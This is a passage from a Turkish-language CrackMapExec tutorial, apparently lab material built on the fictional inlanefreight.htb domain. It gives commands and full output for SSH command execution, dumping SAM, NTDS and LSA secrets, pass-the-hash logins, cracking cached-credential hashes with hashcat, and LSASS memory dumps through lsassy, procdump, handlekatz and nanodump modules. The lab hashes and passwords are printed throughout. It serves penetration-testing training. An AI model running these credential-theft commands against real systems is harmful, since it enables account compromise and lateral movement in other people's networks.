SSH 10.129.204.133 22 10.129.204.133 Subnet Mask . . . . .
. . . . . . : 255.255.255.0
SSH 10.129.204.133 22 10.129.204.133 Default Gateway . . .
. . . . . . :
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Ethernet adapter
Ethernet0 2:
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Connection-specific
DNS Suffix . : .htb
SSH 10.129.204.133 22 10.129.204.133 IPv6 Address. . . . .
. . . . . . : dead:beef::1e2
SSH 10.129.204.133 22 10.129.204.133 IPv6 Address. . . . .
. . . . . . : dead:beef::8c8a:5209:5876:537d
SSH 10.129.204.133 22 10.129.204.133 Link-local IPv6
Address . . . . . : fe80::8c8a:5209:5876:537d%20
SSH 10.129.204.133 22 10.129.204.133 IPv4 Address. . . . .
. . . . . . : 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Subnet Mask . . . . .
. . . . . . : 255.255.0.0
SSH 10.129.204.133 22 10.129.204.133 Default Gateway . . .
. . . . . . : fe80::250:56ff:feb9:b9fc%20
SSH 10.129.204.133 22 10.129.204.133 10.129.0.1
```

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

```
crackmapexec ssh 10.129.204.133 -u julio --key-file id_ed25519 -p "" -x
whoami

SSH 10.129.204.133 22 10.129.204.133 [*] SSH-2.0-
OpenSSH_for_Windows_7.7
SSH 10.129.204.133 22 10.129.204.133 [+] julio: (keyfile:
id_ed25519)
SSH 10.129.204.133 22 10.129.204.133 [+] Executed command
SSH 10.129.204.133 22 10.129.204.133 inlanefreight\julio
```

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --sam

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Dumping SAM hashes
SMB 10.129.204.133 445 MS01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
SMB 10.129.204.133 445 MS01
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB 10.129.204.133 445 MS01
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
SMB 10.129.204.133 445 MS01
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
SMB 10.129.204.133 445 MS01
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
SMB 10.129.204.133 445 MS01
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
SMB 10.129.204.133 445 MS01 [+] Added 6 SAM hashes
to the database

```


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p
'Inlanefreight01!' --ntds

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [-] RemoteOperations
failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.1.10 445 DC01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf36
1aa35efaf:::
SMB 172.16.1.10 445 DC01
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB 172.16.1.10 445 DC01
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f23
8e:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88
057e06a81b54e73b949b:::
SMB 172.16.1.10 445 DC01
david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de
e0:::
SMB 172.16.1.10 445 DC01
john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a
2:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7
247e8d4387e76996ff3f18a34316fdd:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c0
8b424ec2d99589a9cce60:::
SMB 172.16.1.10 445 DC01 
inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc82
1b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821
b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93
ac3bf058a5ea0e8fdb71:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831b
ddc88f6d7517615f3d45:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96
ddbd82224270b57f11fc:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87d
f16aafa336fb6ffbbac59:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f
851b949767163c35ae296:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca9
66c5c0b22eba3c8c4c5ae568b1:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2
d0f48967ab753fba96b34:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c9290
84f0efd75791db7cb963d:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\harris:7104:aad3b435b51404eeaad3b435b51404ee:fb9e4fb946a
15a0c68087bc830b5da12:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\soti:7105:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1
c2baec10a32db22c72d:::
SMB 172.16.1.10 445 DC01
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d
45:::
SMB 172.16.1.10 445 DC01
MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99
c0:::
SMB 172.16.1.10 445 DC01
LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322
dc502:::
SMB 172.16.1.10 445 DC01 [+] Dumped 23 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
08_190342.ntds of which 20 were added to the database
SMB 172.16.1.10 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.1.10 445 DC01 [*] cat
/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190342.ntds | grep -
iv disabled | cut -d ':' -f1
```

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u julio -p Password1 --ntds
--user krbtgt

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.1.10 445 DC01
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f23
8e:::
SMB 172.16.1.10 445 DC01 [+] Dumped 1 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
08_190444.ntds of which 1 were added to the database
SMB 172.16.1.10 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.1.10 445 DC01 [*] cat
/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190444.ntds | grep -
iv disabled | cut -d ':' -f1
```

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p
'Inlanefreight01!' --ntds --enabled

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [-] RemoteOperations
failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.1.10 445 DC01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf36
1aa35efaf:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88
057e06a81b54e73b949b:::
SMB 172.16.1.10 445 DC01
david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de
e0:::
SMB 172.16.1.10 445 DC01
john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a
2:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7
247e8d4387e76996ff3f18a34316fdd:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c0
8b424ec2d99589a9cce60:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc82
1b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821
b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93
ac3bf058a5ea0e8fdb71:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831b
ddc88f6d7517615f3d45:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96
ddbd82224270b57f11fc:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87d
f16aafa336fb6ffbbac59:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f
851b949767163c35ae296:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca9
66c5c0b22eba3c8c4c5ae568b1:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2
d0f48967ab753fba96b34:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c9290
84f0efd75791db7cb963d:::
SMB 172.16.1.10 445 DC01
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d
45:::
SMB 172.16.1.10 445 DC01
MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99
c0:::
SMB 172.16.1.10 445 DC01
LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322
dc502:::
SMB 172.16.1.10 445 DC01 [+] Dumped 21 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
05_162819.ntds of which 18 were added to the database
SMB 172.16.1.10 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.1.10 445 DC01 [*] cat
/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-05_162819.ntds | grep -
iv disabled | cut -d ':' -f1

```


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

```
crackmapexec winrm 10.129.204.133 -u administrator -H
30b3783ce2abf1af70f77d0660cf3453 --local-auth -x whoami

SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
17763 (name:MS01) (domain:MS01)
HTTP 10.129.204.133 5985 MS01 [*]
http://10.129.204.133:5985/wsman
WINRM 10.129.204.133 5985 MS01 [+]
MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
WINRM 10.129.204.133 5985 MS01 [+] Executed command
WINRM 10.129.204.133 5985 MS01 ms01\administrator

```

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --lsa  

SMB         10.129.204.133  445    MS01             
[*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)  

SMB         10.129.204.133  445    MS01             
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)  

SMB         10.129.204.133  445    secrets  

SMB         10.129.204.133  445    MS01             
[+] MS01             
INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT.HTB/david:$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f  

SMB         10.129.204.133  445    MS01             
[+] Dumping LSA  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT.HTB/john:$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:86e98ff8d71ffea8888277605546ff2b8475cc112d81b2a9c3000bb993fa630f  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:350bd90fcadae4e9d7e7dca40f82d316  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:des-cbc-md5:ba234ae034f14c67  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:plain_password_hex:2f671b061503c93e6b673126e95f9086aabbccfe214b1623587574fa982186eab160eb2077b45d7fbcc8c15b0cca80f589423b75e14198cd8ad0f47354c7b48466365384504184dfaf7d7082f25719e8bc710128ae19e66b93a36265ba4623bc26256f2ded1e7154bc65fa7a0e4d8b16d8aaf755b06200e411f4bc8387f09b64976bf7c86b0277b88275fd3fc6e209dbe2b16ac953a2cdf15ac326e54a80d708a01f66a37aa63c6af99e7650c624c18ee3b9f5c839e078d3cd881371b1edf4a904510528d590332a746a455be7f8474688e9e3874821cc41bfa15f12c2d54d1e01ace65ad9331eac018e15e77d6046ac  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:7a09b4655244f2a10ceecf16e7fcdc03:::  

SMB         10.129.204.133  445    MS01             
dpapi_machinekey:0x78f7020d08fa61b3b77b24130b1ecd58f53dd338  
dpapi_userkey:0x4c0d8465c338406d54a1ae09a56223e867907f39  

SMB         10.129.204.133  445    MS01             
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63  

SMB         10.129.204.133  445    INLANEFREIGHT\julio:Password1  
SMB         10.129.204.133  445    INLANEFREIGHT\david:Password2  
SMB         10.129.204.133  445    INLANEFREIGHT\john:Password3  

SMB         10.129.204.133  445    MS01             
[+] Dumped 13 LSA secrets to:  
  /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.secrets  
  /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached  


```


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

```
cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11
08_093944.cached| cut -d ":" -f 2
 $DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
 $DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
 $DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
```


```
 hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 <SNIP>
Dictionary cache hit:
 * Filename..: /usr/share/wordlists/rockyou.txt
 * Passwords.: 14344386
 * Bytes.....: 139921355
 * Keyspace..: 14344386
 $DCC2$10240#julio#c2139497f24725b345aa1e23352481f3:Password1
 <SNIP>
```


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'InlaneFreight01!' -M lsassy

SMB         10.129.204.133 445    MS01         [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)

SMB         10.129.204.133 445    MS01         [+]
inlanefreight.htb\robert:InlaneFreight01! (Pwn3d !!)

LSASSY      10.129.204.133 445    MS01         INLANEFREIGHT\julio
64f12cdda88057e06a81b54e73b949b

LSASSY      10.129.204.133 445    MS01         INLANEFREIGHT\david
c39f2beb3d2ec06a2cb887fb391dee0

LSASSY      10.129.204.133 445    MS01         INLANEFREIGHT\john
c4b0e1b0c7ce2c4723b4e2e407ef81a2
```

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M
procdump

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
PROCDUMP 10.129.204.133 445 MS01 [*] Copy
/tmp/procdump.exe to C:\Windows\Temp\
PROCDUMP 10.129.204.133 445 MS01 [+] Created file
procdump.exe on the \\C$\Windows\Temp\
PROCDUMP 10.129.204.133 445 MS01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP 10.129.204.133 445 MS01 [*] Executing command
C:\Windows\Temp\procdump.exe -accepteula -ma 632
C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP 10.129.204.133 445 MS01 [+] Process lsass.exe
was successfully dumped
PROCDUMP 10.129.204.133 445 MS01 [*] Copy MS01-AMD64-
INLANEFREIGHT.dmp to host
PROCDUMP 10.129.204.133 445 MS01 [+] Dumpfile of
lsass.exe was transferred to /tmp/MS01-AMD64-INLANEFREIGHT.dmp
PROCDUMP 10.129.204.133 445 MS01 [+] Deleted procdump
file on the C$ share
PROCDUMP 10.129.204.133 445 MS01 [+] Deleted lsass.dmp
file on the C$ share
PROCDUMP 10.129.204.133 445 MS01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
PROCDUMP 10.129.204.133 445 MS01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.204.133 445 MS01
INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2

```


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M
handlekatz

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
HANDLEKA... 10.129.204.133 445 MS01 [*] Copy
/tmp/handlekatz.exe to C:\Windows\Temp\
HANDLEKA... 10.129.204.133 445 MS01 [+] Created file
handlekatz.exe on the \\C$\Windows\Temp\
HANDLEKA... 10.129.204.133 445 MS01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
HANDLEKA... 10.129.204.133 445 MS01 [*] Executing command
C:\Windows\Temp\handlekatz.exe --pid:632 --
outfile:C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-
%USERDOMAIN%.log
HANDLEKA... 10.129.204.133 445 MS01 [+] Process lsass.exe
was successfully dumped
HANDLEKA... 10.129.204.133 445 MS01 [*] Copy MS01-AMD64-
INLANEFREIGHT.log to host
HANDLEKA... 10.129.204.133 445 MS01 [+] Dumpfile of
lsass.exe was transferred to /tmp/MS01-AMD64-INLANEFREIGHT.log
HANDLEKA... 10.129.204.133 445 MS01 [+] Deleted handlekatz
file on the C$ share
HANDLEKA... 10.129.204.133 445 MS01 [+] Deleted lsass.dmp
file on the C$ share
HANDLEKA... 10.129.204.133 445 MS01 [*] Deobfuscating,
this might take a while
HANDLEKA... 10.129.204.133 445 MS01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
HANDLEKA... 10.129.204.133 445 MS01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
HANDLEKA... 10.129.204.133 445 MS01
INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2

```


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M
nanodump

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
NANODUMP 10.129.204.133 445 MS01 [*] 64-bit Windows
detected.
NANODUMP 10.129.204.133 445 MS01 [+] Created file
nano.exe on the \\C$\Windows\Temp\
NANODUMP 10.129.204.133 445 MS01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
NANODUMP 10.129.204.133 445 MS01 [*] Executing command
C:\Windows\Temp\nano.exe --pid 632 --write
C:\Windows\Temp\20221108_1148.log
NANODUMP 10.129.204.133 445 MS01 [+] Process lsass.exe
was successfully dumped
NANODUMP 10.129.204.133 445 MS01 [*] Copying
20221108_1148.log to host
NANODUMP 10.129.204.133 445 MS01 [+] Dumpfile of
lsass.exe was transferred to /tmp/cme/MS01_64_inlanefreight.htb.log
NANODUMP 10.129.204.133 445 MS01 [+] Deleted nano file
on the C$ share
NANODUMP 10.129.204.133 445 MS01 [+] Deleted lsass.dmp
file on the C$ share
NANODUMP 10.129.204.133 445 MS01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
NANODUMP 10.129.204.133 445 MS01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
NANODUMP 10.129.204.133 445 MS01
INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2 
```

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

